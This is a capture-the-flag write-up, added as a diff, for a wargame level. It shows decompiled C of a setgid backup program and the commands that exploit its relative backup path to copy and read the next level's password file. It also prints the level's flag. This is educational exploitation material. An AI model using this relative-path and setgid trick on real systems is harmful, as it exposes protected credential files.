@@ -1,0 +1,58 @@
+flag: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+int main(int ac, char **av) {
+	long stack_cannary = *(int *)(in_FS_OFFSET + 20);
+	if (ac != 2) {
+		printf("Usage: %s filename", *av);
+	}
+
+	FILE *log = fopen("./backups/.log", "w");
+	if (!log) {
+		printf("Error");
+		exit(1);
+	}
+
+	log_wrapper(log, "Starting back up: ", av[1]);
+	FILE *stream = fopen(av[1], "r");
+	if (!stream) {
+		printf("Error");
+		exit(1);
+	}
+
+	char buff[] = "./backups/";
+	strncat(buff, av[1], 99 - strlen(av[1]);
+
+	int fd = open(buff, O_WRONLY | O_CREAT | O_NOCTTY, 432); // read/write permissions for owner and grp
+	if (fd < 0) {
+		printf("Error");
+		exit(1);
+	}
+
+	while (true) {
+		char c = fgetc(stream);
+		if (c == -1)
+			break;
+		write(fd, &c, 1);
+	}
+
+	log_wrapper(log, "Finished back up", av[1]);
+	fclose(stream);
+	close(fd);
+
+	if (stack_cannary != *(in_FS_OFFSET + 0x28))
+		stack_check_fail();
+
+	return 0;
+}
+
+
+This level starts with a relative path and not an absolute one, so we can recreate the
+architecture expected by the program somewhere else.
+
+> mkdir -p /tmp/level08/backups/home/users/level09; cd /tmp/level08; /home/users/level08/level08 /home/users/level09.pass
+
+The program read the flag and wrote it in the file /tmp/level08/backups/home/users/level09/.pass
+The program being setgid and the group of the program being users, group in which
+the user level08 is, we have read permissions on the .pass file:
+
+> cat backups/home/users/level09/.pass
